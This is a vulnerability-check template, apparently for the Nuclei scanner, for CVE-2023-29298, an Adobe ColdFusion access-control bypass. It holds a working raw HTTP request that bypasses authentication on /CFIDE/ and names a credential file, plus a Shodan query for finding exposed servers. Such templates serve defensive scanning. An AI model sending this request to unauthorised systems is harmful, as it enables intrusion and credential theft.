id: CVE-2023-29298

info:
  name: Adobe ColdFusion - Access Control Bypass
  author: rootxharsh,iamnoooob,pdresearch
  severity: Critical
  description: |
    An attacker is able to access every CFM and CFC endpoint within the ColdFusion Administrator path /CFIDE/, of which there are 437 CFM files and 96 CFC files in a ColdFusion 2021 Update 6 install.
  reference:
    - https://www.rapid7.com/blog/post/2023/07/11/cve-2023-29298-adobe-coldfusion-access-control-bypass/
    - https://nvd.nist.gov/vuln/detail/CVE-2023-29298
  metadata:
    shodan-query: http.component:"Adobe ColdFusion"
  tags: cve,cve2023,adobe,auth-bypass,coldfusion

http:
  - raw:
      - |
        POST //CFIDE/wizards/common/utils.cfc?method=wizardHash^&inPassword=foo^&_cfclient=true^&returnFormat=wddx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _variables={"about":{"_metadata":{"classname":"\..\lib\password.properties"},"_variables":{}}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<wddcPacket'
          - '<struct>'
        condition: and

      - type: status
        status:
          - 200
